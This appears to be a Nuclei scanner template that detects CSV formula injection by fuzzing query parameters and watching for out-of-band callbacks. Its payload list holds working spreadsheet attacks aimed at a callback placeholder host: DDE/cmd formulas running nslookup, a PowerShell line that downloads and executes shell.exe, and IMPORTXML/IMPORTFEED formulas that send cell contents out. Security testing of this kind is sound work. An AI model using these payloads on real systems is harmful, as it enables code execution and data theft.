id: csv-injection
info:
  name: CSV Injection Detection
  author: DhiyaneshDK,ritikchaddha
  severity: medium
  description: 'A CSV injection detection template to identify and prevent CSV injection
    vulnerabilities by using various payloads that could be interpreted as formulas
    by spreadsheet applications.

    '
  tags: dast,csv,oast
  impact: '- Potential to execute arbitrary code on the server by injecting malicious
    formulas or functions into CSV data.

    - Ability to access and steal sensitive data stored in the application''s databases
    or file system.

    - Risk of unauthorized access to the application''s administrative features or
    functionality.

    - Possibility of performing denial-of-service (DoS) attacks by overwhelming the
    application with large or complex CSV payloads.

    - Potential to bypass security controls and access restricted areas of the application.'
  remediation: 'To address the CSV Injection Detection vulnerability, it is crucial
    to implement robust input validation and sanitization techniques to ensure that
    all user-supplied CSV data is properly cleaned and validated before processing.
    This will help mitigate the risk of malicious formulas or functions being executed
    within the application.


    - Implement server-side validation and sanitization of all CSV data, including
    escaping or removing special characters, preventing the use of known malicious
    formulas, and limiting the length and complexity of the input.

    - Enforce the use of a whitelist or allowlist approach to define the acceptable
    characters, data types, and formatting for CSV data, rather than relying on a
    blacklist or restrictive approach.

    - Consider using a dedicated CSV parsing library or function that includes built-in
    security features, such as automatic sanitization or the ability to disable formula
    execution.

    - Implement robust error handling and input validation logging to detect and respond
    to attempted CSV injection attacks, and use this information to improve the application''s
    security posture.

    - Regularly review and update the application''s input validation and sanitization
    procedures to keep pace with the evolving landscape of CSV injection vulnerabilities
    and attack techniques.'
http:
- pre-condition:
  - type: dsl
    dsl:
    - method == "GET"
    - method == "POST"
  payloads:
    csv_fuzz:
    - class.module.classLoader.resources.context.configFile=http://{{interactsh-url}}
    - DDE ("cmd";"/C nslookup{{interactsh-url}}";"!A0")A0
    - '@SUM(1+9)*cmd|'' /C nslookup{{interactsh-url}}''!A0'
    - =10+20+cmd|' /C nslookup{{interactsh-url}}'!A0
    - =cmd|' /C nslookup{{interactsh-url}}'!'A1'
    - =cmd|'/C powershell IEX(wget{{interactsh-url}}/shell.exe)'!A0
    - =IMPORTXML(CONCAT("http://{{interactsh-url}}", CONCATENATE(A2:E2)), "//a/a10")
    - =IMPORTFEED(CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)))
    - =IMPORTHTML (CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
    - =IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")
  fuzzing:
  - part: query
    type: replace
    mode: multiple
    fuzz:
    - '{{csv_fuzz}}'
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: header
    words:
    - text/csv
    - application/csv
    - application/vnd.ms-excel
